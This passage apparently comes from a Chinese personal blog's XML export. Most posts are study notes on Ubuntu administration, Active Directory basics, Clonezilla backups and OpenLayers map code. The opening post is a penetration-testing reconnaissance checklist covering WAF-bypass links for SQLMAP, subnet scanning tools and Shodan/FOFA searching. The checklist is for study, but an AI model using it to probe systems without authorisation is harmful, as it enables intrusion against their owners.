http://www.cngis.cn 应用的防火墙、硬件的防火墙 SQLMAP的几个WAF绕过方法： https://9bie.org/index.php/archives/465/ 有无其他应用APP或手机站点 第三方接口（微信公众号等） IP网段网络信息 IP : IP对应网站 IP对应目录扫描 （设置的时候，目录设置为www.xxx,com。 192.168.1.112访问的是站点，但是www.xxx.com访问的是站点下面的一个目录。一个ip对应多个域名多个站点，单一个域名只有一个ip）网段： C段信息扫描 网段 192.168.0.1 -192.168.0.255 在线C段查询（拿到同网段后，再进行另一个主机，相当于内网渗透了）工具: DotNetScan iisput增强版 robots协议直接访问地址/robots.txt获取相关目录地址信息 shodanzoomeyefofa 利用搜索。或者脚本开发进行批量/调用 伪静态如果看到一个以.html或者.htm结尾的网页，此时可以通过呢在在地址输入框中输入：javascript:alert(document.lastModified)，来得到网页最后的修改时间，如果得到的时间和现在时间一致，此页面就是伪静态，反之是真静态；因为动态页面的最后修改时间总是当前时间，而静态页面的最后修改时间则是它生成的时间。 https://blog.csdn.net/Fly_hps/article/details/79487137 https://blog.csdn.net/zezai3010/article/details/78797944 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server 包管理]]></title>
    <url>%2Fposts%2Fb9efd53%2F</url>
    <content type="text"><![CDATA[DPKG包管理器（本地） ​ dpkg -l 导出软件包，在新系统上安装dpkg -L xxd 查看某个软件包在电脑上包含哪些文件dpkg -S /usr/.../man1 看这个文件来自哪个软件包dpkg -i xxxname_version_架构.deb 安装 // 架构(amd64, i386)dpkg --print-architecture 查看系统的支持的架构dpkg --print-foreign-architectures 查看系统是否支持其他的架构 cat /var/lib/dpkg/arch 查看系统是否可以拓展支持其他架构类型 可以让系统支持其他类型架构dpkg --remove-architecture i386 删除支持某个架构 dpkg -r name:amd64 卸载软件包（可以带上架构） 不删除配置文件dpkg -P name 卸载并删除配置 APT包管理器# 源文件 cat /etc/apt/sources.list | grep -v ^# 不显示#号开头的 /etc/apt/sources.list.d/ 目录下面是第三方的软件源 sudo apt upgrade # 对已经安装的包更新 sudo apt dist-upgrade # 更新新包，删除旧包（包含内核） sudo apt remove nmap --purge # 删除包和配置文件 -- /var/log/dpkg.log apt list --upgradeable # 查看可以更新的包 apt serach 'network mapper' # 搜索 sudo apt show nmap # 查看软件包详细描述 # 卸载, 卸载完成之后再把不用的autoremove等 sudo apt remove nmap --purge sudo apt purge nmap sudo apt autoremove # 谨慎使用！！！（某系文件可能是旧版内核的依赖包，如果回退老版本可能会出现问题） /var/cache/apt/archives # 下载到这里来了（里面不需要的deb包可以删除。只是下次再次需要的时候重新下载） /var/lib/apt/ # 更新源的索引文件.list # .deb 是打包好的，不显示源代码 apt download nmap # 下载但是不安装(.deb包) apt source asw # 把源代码下载下来，可以可以下载之后自己编译安装 apt showsrc nmap # 查看源代码 自动更新（无人值守）sudo apt install unattended-upgrades # 配置主配置文件 /etc/apt/apt.conf.d/50unattended-upgrades 允许：一般只允许security那个 黑名单： # 配置文件2 /etc/apt/apt.conf.d/10periodic 更新/下载/清除/安装 周期 # 重启服务 sudo service unattended-upgrades restart sudo systemctl restart unattended-upgrades.service # 新版本ubuntu推荐 # 日志 cat /var/log/unattended-upgrades/unattended-upgrades-xxxxxxxx.log sudo lsb_release -a # 查看版本和code_name 无人值守更新通知# 配置文件 /etc/apt/apt.conf.d/50unattended-upgrades中的mail，指定邮箱 # apticron软件包，用来发邮件的 sudo pt install apticron 多手动练习，少复制 APT更新源配置推荐使用官方更新源 deb 指的是安装包文件deb-src 是deb相关的，还没有编译成deb的源文件 生产环境中，尽量用前两种类型的 第三方库 apt-key addapt-ket del PPA SNAP包管理 发展趋势非常好 SNAP包管理可以先安装snap: apt install snap sudo snap find nmap sudo snap install nmap sudo snap remove sudo snap sudo snap refesh nmap # 更新单个软件包 sudo snap refresh # 更新索引文件 # 同时安装多个软件包（彼此独立） # 作为apt的补充 # snap的软件包会下载到一个目录： /snap/bin/... document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[内网第一章 - 内网基础知识]]></title>
    <url>%2Fposts%2F7e7ba1a0%2F</url>
    <content type="text"><![CDATA[基础知识 工作组 类似一个社团，不存在集中管理，无服务机与客户机之分，是对等的 将不同的计算机按功能（或部门）分别列入不同的工作组中 实例：加入/更改/退出 工作组： 计算机- 属性- 计算机名- 更改设置- 工作组更改- （修改名称。若没有这个工作组会新建）- 重启 域域(Domain)一个有安全边界的计算机集合（安全边界： 是指在两个域中，一个域中的用户无法访问另一个域中第资源），可以理解为升级版的“工作组” 域控制器(Domain Controller, 简写为DC)一个域中一个类似管理服务器的计算机，相当于单位的门卫一样，域内电脑如果想互相访问，首先都是经过它的审核 域的分类 单域 （固定位置的小公司。一个yu内要建立至少两个DC，一个作为备份DC） 父域、子域 （比如一个大公司，有分公司；不同地理位置分公司；子公司可以通过自己的域管理自己的资源； 出于安全策略） 域数(tree) 域森林(forest) DNS域名服务器 (实际上，域的name就是DNS域的name； 通常dns服务器与DCS 是一台机器) 活动目录（Active Directory，AD）是指域环境中提供目录服务的组件。 目录是什么？目录就是存储有关网络对象（如用户、组、计算机、共享资源、打印机和联系人等）的信息。目录服务是指帮助用户快速、准确地从目录中找到其所需要的信息的服务。活动目录实现了目录服务，为企业提供了网络环境的集中式管理机制 活动目录相当于字典的索引，即活动目录里的资源就是字典资源的快捷方式，用户通过寻找快捷方式而定位资源 逻辑结构组织对象的做法不考虑被管理对象的具体地理位置的组织框架 活动目录的逻辑结构就包括： 组织单元(ou)、域(domain)、域树(tree)、域森林(forest) 在域树内的所有域共享一个活动目录，这个活动目录内的数据分散的存储在各个域内，且每个域只存储该域内的数据。 活动目录主要功能 账号集中管理 软件集中管理 环境集中管理 增强安全性 更可靠 活动目录为Microsoft统一管理的平台 DC与AD最大的区别是：域控制器（DC）与活动目录（AD）最大的区别是：如果网络规模较大，就考虑把网络中的众多对象，如计算机、用户、用户组、打印机、共享文件等，分门别类、井然有序地放在一个大仓库中，并将检索信息整理好，以便查找、管理和使用这些对象（资源）。这个拥有层次结构的数据库，就是活动目录数据库，简称 AD 库。 那么，我们应该把这个数据库放在哪台计算机上呢？用于存储活动目录数据库的计算机称为DC 所以，要实现域环境，其实就是要安装 AD。当内网中的一台计算机上安装了 AD，它就变成了 DC 安全域目的： 将一组安全等级相同的计算机划入同一网段内 DMZ“隔离区”， “非军事化分区”， 为了解决安装防火墙后外部网络不能访问内部网络费武器的问题 放置 一些必须公开的服务器设施，比如：企业web服务器、FTP服务器和论坛等 有效的保护了内部网络 DMZ的屏障功能: 内网可以访问外网 内网可以访问DMZ 外网不能访问内网 外网可以访问DMZ DMZ不能访问外网 DMZ不能访问内网 域中计算机分类 域控制器 成员服务器 客户机 独立服务器 内权限解读域本地组 （来自全林用于本域）多域用户访问单域资源（访问同一个域），不能嵌套于其他组中，主要是用于授权位于域资源的访问权限 全局组 （来自本域作用于全林）单域用户访问多域资源（必须是同一个域里面的用户），全局组嵌套在其他组中 通用组 （来自全林作用于全林）通用组成员来自域林中任何域中的用户账户、全局组和其他的通用组，可以在该域林中的任何域中指派权限，可以嵌套于其他域组中。非常适于域林中的跨域访问。 A-G-DL-P策略A - 用户账号G - 全局组U - 通用组DL - 域本地组P - 资源权限 A-G-DL-P策略 是将用户账号添加到全局组中，讲全局组添加到域本地组中， 然后为域本地组分配资源权限。按照AGDLP的原则对用户组织和管理起来更容易 在AGDLP形成以当给一个用户某个权限的时候，只要把这个用户家到某一个本地域组就可以了。 全局组、通用组的权限 域管理员组 Domain Admins 企业系统管理员组 Enterprise Admins 架构管理员组 Schema Admins 域用户组 Domain Users 本地组的权限： Administrators (管理员组) Remote Desktop USer （远程登录组） Print Operator (打印机操作员组) Account Operators （账号操作员组） Server Operater （服务器操作员组） Backup Operators (备份操作员组 ) 域环境搭建Windows 2012 R2 设置IP 更改计算机名 安装域控制器和DNS服务 升级服务器 创建Active Directory用户 Windows7 Windwos7 通过防火墙Monowall构建二级内网防火墙Monowall的使用开源，基于软件的防火墙， 基于Web页面管理的 中文版： www.cat-home.org/?action=show&amp;id=158 网络适配器: 2个， 一个NAT，一个桥接，硬盘要求特别低； 配置： document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>内网</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu server-基础命令]]></title>
    <url>%2Fposts%2Ff8860a86%2F</url>
    <content type="text"><![CDATA[基本Shell常识ctrl + D # 结束当前输入 ctrl + c # 强制结束一切 # bash ls参数:-l -a -d 只显示目录自身信息 -i 显示inode信息 -S 按文件大小排序 -r 倒序 -t 按修改时间排序 -h 文件大小便于人类阅读方式 cpcp file1 file2 cp file1 f2 dir/ 参数:-R/r 拷贝目录 -l 硬链接拷贝(ls -li) # node的值是相同的,对应的硬盘数据块是相同的,只是多了一个指向 -s 软连接拷贝 (ls -li查看时候第一个字母是'l') #inode值相同, 只是指向了真实的文件,快捷方式 -S 目标名称添加后缀 `cp -S -bak b b1` # 把b拷贝为b1的时候,目标文件b1加上后缀-bak -u 源比目标新时才拷贝 `cp -u aa /home/a` # 保存更加新的文件 mv参数:mv f1 f2 mv f1 f2 dir/ -f # 强制移动 touch参数:- 如果文件名存在,修改文件mtime, 但不修改内容 rm参数:-i # 每删除之前提醒 -d # 删除空目录 rm -rf echo将命令参数显示在stdout 参数:-n # 显示结束不换行 -e # 解释反斜线转义符 `echo \"n"` `echo -ne 123\\b` echo -e a\\n 目录结构目录 &gt; 分区 /bin/ /boot/ /dev/ /etc/ /home/ /lib/ /media/ /mnt/ /opt/ /sbin/ /srv/ /temp/ /usr/ /var/ /root/ /proc/ mkdir参数:-p # 按需创建父目录 pwd参数:-P # 物理路径(软连接对应的真实路径) -L # 逻辑路径(软连接自身路径) rmdir参数:-p # 递归删除 通配符: grepsudo grep root /etc/* 参数:-i # 忽略大小写 -v # 反相匹配 -n # 显示行号 -r # 递归目录和子目录中所有文件 -c # 显示目标文件中包含关键字的行数 -f 1.txt 2.txt # 1.txt中多个关键字同时匹配 -E '1|2|3' a.txt # 或者1或者2或者3 grep a[123] a.txt a1,a2,a3 lessmore的增强版 参数: 快捷键:z/b # 向前/后翻页 v # 进入编辑模式 g/G # 直接跳过第一行/最后一行(或第n行) /word # 向前搜索关键词 ?word # 向后搜索关键词 n/N # 正向/反向继续搜索关键字 q # 退出 grep xxx/words | less nano参数: head / tail显示文件头/尾部内容, 默认10行 参数:-n # 指定显示的行数 比如: -3 -f # 实时显示 tail -f a.txt # tailf 命令 diff参数:-u # 统一格式输出 -y # 并排输出比较 # | "不同", ; 配合-w参数限制宽度 -w # 忽略空格 -i # 忽略大小写 file检测文件格式 顺序执行三种测试集: filesystem 匹配系统头文件&lt;sys/stat.h&gt; magic , -l 查看 language, 匹配文件起始位置的字符类型 一种测试匹配即停止检测,全都不匹配返回data 参数:-f # 文件列表 -ib # mime类型 find参数:-name -type # b c d f l -user -mtime +1 -mtime -20 关于时间的概念: atime, ctime amin, nmin, cmin -cnewer file # 比这个文件更加新的文件 find / -mtime 1 # 昨天到前天,发生修改的文件 find / -mtime +1 # 昨天之前所有修改的,,, find / -mtime -1 # 昨天到now,发生修改的文件 stat查看文件详细信息 参数: locate基于文件索引进行搜索 不验证文件是否存在,速度快但结果不准确 updatedb更新索引 参数: sortsort a.txt 参数:-r # 反向排序 -n # 按照数值大小排序 -M # 按照月份排序 # 另一个排序的命令 ls -l --sort=key size time extension 只有先排序,才能取唯一值 ​ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu推荐生产力软件]]></title>
    <url>%2Fposts%2F7628e%2F</url>
    <content type="text"><![CDATA[基础软件包sudo apt intall flashplugin-intaller # 安装浏览器flash插件 sudo apt install meld # 对两个目录/文件 一一比对 sudo apt install amule # 电驴 sudo apt install transmission # BT下载工具 （还可以） sudo apt install qbittorrent # BT下载工具 sudo apt install ttf-wqy-microhei # 字体文件 sudo apt install mtr # 网络路径追踪工具（基于图形化） sudo apt install whois sudo apt install git sudo apt install curl # 命令行完成对浏览器访问的基本操作（写脚本常用） sudo apt install obs-studio # 录屏 （图标是旋风形状的，也可以直播） sudo apt install ubuntu-restricted-extras # 一组视频的解码器 sudo apt install libavcode-extra libdvd-pkg # 使得linux可以比方dvd的介质。配合上面那个 sudo apt install unrar unrar-free # 解压rar文件 sudo apt install woeusb # 将iso文件刻录到u盘上面 sudo apt install ascii # 运行命令查看常用的ascii编码 sudo apt install unicode # unicode 你好， 转换为对应uniode编码 sudo apt install axel # 基于字符界面的下载工具（比wget与curl强大） # 支持断点续传等等 安装javasudo add-apt-repository ppa:webupd8team/java sudo apt-get update sudo apt-get install oracle-java8-installer oracle-java8-set-default source /etc/profile # 将oracle的java设为默认环境，替换open java 中文输入法sudo apt install ibus ibus-pinyin imconfig # 运行，安装向导，选择ibus reboot 设置，将只能中文输入法加入（或者supingyin） # ibus有个小bug，手动修复： ibus-setup 然后取消上面的勾选 常用软件 chrome Golddict （中英文翻译） sudo apt intasll goldendict 词典配置界面，website，添加 有道翻译的url 不会的：选中，连续快速两次ctrl+c 邮件客户端 mailspring # UI美观，但是性能不是很好 thunderbird # 性能好，太丑 Protonmail Desktop # 最安全的邮件（质子形状的） 推荐安全从业者 Office WPS for Linux # 唯一推荐 onlyoffice # 客户端不成熟，可以集成到云上， to-do-list （列表清单软件）zenkit # 打开ubuntu的软件仓库，可以直接搜索安装 ， 也可以做为看板类型软件 印象笔记Tusk # 软件仓库搜索安装即可，可以同步印象笔记 书籍管理calibre 虚拟机virtualBox / VMWare Workstation 下载工具 uGet # 类似图形化的axel，支持断点续传 aMule Transmission 图形图像视频编辑 GIMP # 开源软件中的ps VLC kenlive # 视频编辑 pitivi # 视频编辑 思维导图MindMaster # 国产 appimage 程序下载打包软件方式，大大降低了软件安装的成本（类似于绿色软件方式），建议多逛逛 https://appimage.github.io document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu常用快捷键]]></title>
    <url>%2Fposts%2F8cfa1f14%2F</url>
    <content type="text"><![CDATA[快捷键 ctrl + alt + up/down 快速切换linux虚拟桌面 Win + a shift/alt + PrintScreen shift:截图（光标变成十字，手动框选） alt: 截取当前窗口 Win + up/down/left/right 将当前应用窗口移动贴到桌面的左右， 下：回到原位置，上：放到最大 ctrl + alt + t 打开终端 再ctrl +shift + n: 新建一个终端 ctrl + d 关闭当前终端窗口 ctrl + shift + t 以tab方式打开新终端 ctrl + shift + c/v 终端里面的复制粘贴 win + d 快速返回显示桌面 ctrl + w/q + w: 关闭一个浏览器/某些应用的页签 + q：关闭所有浏览器/某些应用页签 ctrl + h 将当前应用窗口最小化 win + L 锁定用户对话（锁屏） win + m 打开日历 alt + win + 8 所有内容变为一倍（授课可以用），再按就回去了 win + shift + pageUP/pagedown 将当前应用窗口移动到上一个/下一个虚拟桌面 alt + tab 切换程序窗口 ctrl + t 新建标签页 CTRL + L 跳到地址栏 CTRL + K 跳到搜索引擎输入框 CTRL + D 收藏到书签 Alt + F4 关闭当前窗口 常见终端快捷键Ctrl + Alt + T：打开终端 Tab：命令或文件名自动补全 Ctrl + Shift + C：复制 Ctrl + Shift + V：粘贴 Ctrl + Shift + T：在同一个窗口新建终端标签页 Ctrl + Shift + W：关闭标签页 Ctrl + Shift + N：新建终端窗口 Ctrl + Shift + Q：关闭终端窗口 Ctrl + Shift + PageUp：标签页左移 Ctrl + Shift + PageDown：标签页右移 Ctrl + D：关闭标签页 Ctrl + L：清除屏幕 Ctrl + C：终止当前任务 Ctrl + P：显示上一条历史命令 Ctrl + N：显示下一条历史命令 Ctrl + R：反向搜索历史命令 Ctrl + J/M：回车（同enter键功能） Ctrl + A：光标移动到行首 Ctrl + E：光标移动到行尾 Ctrl + B：关闭想后移动一个位置（backward） Ctrl + Z：把当前任务放到后台运行 Ctrl + PageUp：前一个终端标签页 Ctrl + PageDown：下一个终端标签页 F1：打开帮助指南 F11：全屏切换 Alt + F：打开“文件”菜单（file） Alt + E：打开“编辑”菜单（edit） Alt + V：打开“查看“菜单（view） Alt + S：打开“搜索”菜单（search） Alt + T：打开“终端”菜单（terminal） Alt + H：打开“帮助”菜单（help） Ctrl + →：光标移动到上一个单词的词首 Ctrl + ←：光标移动到下一个单词的词尾 Ctrl + T：将光标位置的字符和前一个字符进行位置交换 Ctrl + U：剪切从行的开头到光标前一个位置的所有字符 Ctrl + K：剪切从光标位置到行末的所有字符 Ctrl + Y：粘贴Ctrl + U/Ctrl + K剪切的内容 Ctrl + H/*：删除光标位置的前一个字符（backspace键功能） Ctrl + D：删除光标位置的一个字符（delete键功能） Ctrl + W：删除光标位置的前一个单词（Alt + Backspace组合键功能） Ctrl + &amp;：恢复Ctrl + H/D/W删除的内容 Ctrl + Win + ↑：最大化当前窗口 Ctrl + Win + ↓：还原/最小化当前窗口 Ctrl + Win + D：最小化所有窗口 Win + W：展示所有窗口 Win + T：打开回收站 2次连续Tab/4次连续Esc/2次连续Ctrl + I：将显示所有命令和工具名称 ctrl-B # 左 ctrl-F # 右 ctrl-P # 上 ctrl-N # 下 ctrl-A # 光标到行首 ctrl-E # 光标到行尾 ctrl-W # 删除光标前以空格分隔段落 ctrl-U # 删除光标到行首 ctrl-K # 删除光标到行首 ctrl-Y # 粘贴删除的内容 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux系统备份]]></title>
    <url>%2Fposts%2F5cd3d1a%2F</url>
    <content type="text"><![CDATA[系统备份怎么备份常见的备份工具0.Ghost 1. DIsks (ubuntu系统查找： disks, 缺点:过程中不能压缩空间，原来多少现在备份文件就是多少)备份： 选择硬盘右上角“create disk image”, 选择存储目录, 点击”start…” 还原： 选择硬盘右上角“restore disk image”， 选择备份好的硬盘文件，“start” 2. Clonezilla (备份过程中实现镜像) 源自台湾政府安全部门的开源项目 支持网络以及外置存储设备 服务器客户端部署 https://clonezilla.org 适合大批量的… 下面是clonezilla的 实例：1. Clonezilla 的备份下载 主要是两个版本，两个稳定版本和下面两个测试版本： Live release Extra info Other notes alternative stable - 20191024-eoan checksums, checksums gpg,changelog, known issue, release note Ubuntu-based, ? stable - 2.6.4-10 checksums, checksums gpg changelog, known issue, release note Debian-based, ? alternative testing - 20191226-eoan 20191226-focal checksums, checksums gpg, changelog, known issue checksums, checksums gpg, changelog, known issue Ubuntu-based, ? testing - 2.6.5-8 checksums, checksums gpg, changelog, known issue Debian-based, ? case1. 只有一个硬盘：（对分区做备份） 1.建议对硬盘分区，一个小的只安装系统啥啥，另一个分区存放资料与分区。备份一个分区 2.备到外置存储设备 case2. 不止一块硬盘 (这个)对那个系统整个硬盘做备份 下面是对新虚拟机的实验环境： （自己的机器不用做这一步） 使用disk 对新硬盘格式化：点击硬盘format disk 分区：create Partition 可以直接选择最大的分区 给个卷标： 比如bak 挂载： 点击 “播放”形状的按钮 下面开始 准备备份 1.选择使用这个clonezilla 的iso来引导打开操作系统 2.然后在界面选live就行， 第二个选项other mode 可以选择分辨率 3.语言、键盘等自己选择 4.选择克隆类型： ​ 设备对设备，硬盘对硬盘,… ​ 这里（对本机）就选设备到image (如果是还原的过程，就选image-到device) 5.选择image存放位置(有本地和云或者ssh服务器)，这里选local device 6.回车，开始识别本地设备，设备识别完成后，再按ctrl + c 7.选择第二个硬盘(即目标位置)来存放image文件， 按住tab选择 done, 继续回车 8.接下来，建议选择第一个选项：Beginner mode , 即初学者（接下来的操作会有信息提示） 9.接下来，选择save disk（保存硬盘） / save part（保存分区） ， 然后选择保存的名称 10.选择备份源： tab来选择第一个硬盘（即需要备份的系统盘） 11.下一步，选择备份过程是否进行检查，推荐不检查* （即-sfsk） 下一步，是否再对生成的影像文件 进行检查 yes/no , 一般不用检查， tab选择no 13.选择 加密(enc)/不加密（senc）, 即是否在还原的时候需要输入密码 14.接下来，选择备份之后是关机(poweroff)还是重启(reboot)？ 按回车进行下一步，确认无误后按住yes 15…….开始备份…… （时间大概10分钟之内） 16….备份完自动重启，挂载上硬盘，就会看到那个备份映像的文件夹 2. Clonezilla 的还原插入光盘到光驱，即clonezila的iso文件 使用Clonezilla引导，选择live，（同上） start clonezilla 扔选择device -&gt; image 选择Local device 他自动识别硬盘， ctrl+c结束识别 接下来自己选择磁盘映像的硬盘的分区，选择映像文件所在的文件夹，选择done 选择 beginer mode 选择 restoredisk 选项： 选择ok 选择sda（即还原到哪） 是否检查选项， 欢迎之后选择是否关机/重启 回车 回车 确认无误后输入yes回车 ……开始恢复…… document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>Ubuntu</tag>
        <tag>系统备份</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[弹出地图并缩放到指定经纬度]]></title>
    <url>%2Fposts%2Fa208ada%2F</url>
    <content type="text"><![CDATA[点击【地图查看】，弹出地图，并缩放到当前某一xx的范围效果大致是这样(图没了)： 先把弹窗的页面元素写出来 &lt;!--弹出层时背景层DIV--> &lt;div id="fade" class="black_overlay"> &lt;/div> &lt;!-- 主体部分 --> &lt;div id="MyDiv" class="white_content"> &lt;div style="text-align: left; cursor: pointer; height: 40px; display:inline-block; float:left"> &lt;span style="font-size: 16px; font-weight:bold; line-height:40px;" id="dtval">&lt;/span> &lt;/div> &lt;div style="float:right; text-align: right; cursor: pointer; height: 40px; display:inline-block"> &lt;button type="button" class="close" style="font-size: 30px;font-weight: bold; background: none;border: none;outline: none;position: relative;right:6px;top:4px " onclick="CloseDiv('MyDiv','fade')" title="关闭详情">×&lt;/button> &lt;/div> &lt;iframe frameborder="0" id="iframepagemap" name="iframepage" scrolling="no" style="width: 100%;height: 100%;" src="">&lt;/iframe> &lt;/div> 绑定按钮的点击事件 &lt;button type="button" class="btn btn-primary bottomBtn catMapBtn" onclick="ShowDiv('MyDiv','fade')">地图查看&lt;/button> //两个参数 分别是弹出主体和遮罩背景 的id js文件中： 弹窗方法 var initmap = false; //弹出隐藏层 function ShowDiv(show_div,bg_div){ document.getElementById(show_div).style.display='block'; document.getElementById(bg_div).style.display='block' ; var bgdiv = document.getElementById(bg_div); bgdiv.style.width = document.body.scrollWidth; // bgdiv.style.height = $(document).height(); $("#"+bg_div).height($(document).height()); var iframe = document.getElementById("iframepagemap"); if(!initmap){ $("#iframepagemap").attr("src","../map/map.jsp"); var i = 0; var finishmap = setInterval(function () { if (iframe.contentWindow.map!=null){ map = iframe.contentWindow.map; initM= iframe.contentWindow.initM; OpenLayers = iframe.contentWindow.OpenLayers; LayerSwitcherExt = iframe.contentWindow.LayerSwitcherExt; clearInterval(finishmap); initmap = true; // 项目范围ajax LonatDetail(xmNameStr); }else{ i++; } },100) }else{ // 项目范围ajax LonatDetail(xmNameStr); } }; 获取项目区域的ajax function LonatDetail(xmNameStr){ $.ajax({ url:baseurl + "Program.action", type:"POST", data:{ method:"progremLonat", paramts:xmNameStr, }, dataType: "json", success: function(data){ addPolygon(data[0]['LONLAT']); }, error: function(msg){ alert("ajax Error!"); } }) } // 从后台拿到的data为： /* 0: {LONLAT: "[{"x":100.12341032715,"y":30.675432620386},{"x":12…96102,"y":55.555}]"} */ 地图范围的缩放与绘制面 // 弹出地图缩放至 function addPolygon(data){ data2 = eval("("+data+")"); //解析json字符串为json对象 var paths = []; // 存储坐标 for (var a = 0; a &lt; data2.length; a++) { var pf = new OpenLayers.Geometry.Point( data2[a]["x"], data2[a]["y"]); // 点的数组 paths.push(pf); } var stylePolyline = { //画面的样式 strokeWidth : 2, strokeOpacity : 0.8, strokeColor : "blue", fillColor : "white", fillOpacity : 0.5 }; // 点组织成线 var line = new OpenLayers.Geometry.LinearRing(paths); // 由线组织成面 var polygon = new OpenLayers.Geometry.Polygon(line); var featureLine = new OpenLayers.Feature.Vector(); featureLine.geometry = polygon; featureLine.style = stylePolyline; map.setLayerIndex(map.getLayer("drawLayer"), map.layers.length - 1); map.getLayer("drawLayer").removeAllFeatures(); map.getLayer("drawLayer").addFeatures(featureLine); lonlat = featureLine.geometry.getBounds().getCenterLonLat(); var zoom = map.getZoomForExtent(featureLine.geometry.getBounds()) - 1; if(zoom == 20){ zoom = 19; } map.setCenter(lonlat,zoom); //缩放到lonlat, zoom是范围大小 }; 关闭弹窗的方法 //关闭弹出层 function CloseDiv(show_div,bg_div) { document.getElementById(show_div).style.display='none'; document.getElementById(bg_div).style.display='none'; }; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>GIS</category>
      </categories>
      <tags>
        <tag>GIS</tag>
        <tag>webgis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ol2实现地图聚合功能]]></title>
    <url>%2Fposts%2F698f7c9a%2F</url>
    <content type="text"><![CDATA[折腾了好久，终于把地图聚合给做出来了，这还得感谢杨姐姐最终的指点（不对，是帮助了很多）。下面我就直接贴代码了。 代码的主目录是这样的：( cluster.html &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;title>OpenLayers Control/SelectCluster&lt;/title> &lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> &lt;link rel="stylesheet" href="style.css" /> &lt;script type="text/javascript" src="OpenLayers.js">&lt;/script> &lt;script type="text/javascript" src="Cluster.js">&lt;/script> &lt;script type="text/javascript" src="SelectCluster.js">&lt;/script> &lt;script type="text/javascript"> var map, clayer, ctrl; function initMap() // 初始化地图，可以拿来放到自己对应的位置 { // Nouvelle carte map = new OpenLayers.Map("map"); // OSM map.addLayer ( new OpenLayers.Layer.OSM() ); // Ajouter un controle pour les couches map.addControl(new OpenLayers.Control.LayerSwitcher()); // Centrer la carte var WGS84 = new OpenLayers.Projection('EPSG:4326'); map.setCenter(new OpenLayers.LonLat(2.424, 48.845).transform(WGS84, map.getProjectionObject()), 13); // Cluster layer's style var style = new OpenLayers.Style ({ pointRadius: 12, externalGraphic: "img/pins.png", backgroundGraphic: "img/pinsback.png", graphicYOffset:-24, backgroundXOffset: 0, backgroundYOffset: -16, graphicZIndex: 11, backgroundGraphicZIndex: 10, fillColor: "${fcolor}", //"#F0C20C", fillOpacity: 1, strokeColor: "#333", strokeWidth: 2, strokeOpacity: 1, labelSelect: false, //label: "${label}", //labelYOffset: "${labelOffset}", fontFamily: '"Luxi sans","Lucida Grande",Lucida,"Lucida Sans Unicode",sans-serif', fontSize: "${fSize}", fontWeight : "bold", cursor:"pointer" }, { context: { label: function(f) { if (f.cluster) return f.cluster.length ? f.cluster[0].attributes.n : ""; return f.attributes.n; }, labelOffset: function(f) { return (f.cluster &amp;&amp; f.cluster.length>1) ? "" : -8; }, fSize: function(f) { return (f.cluster 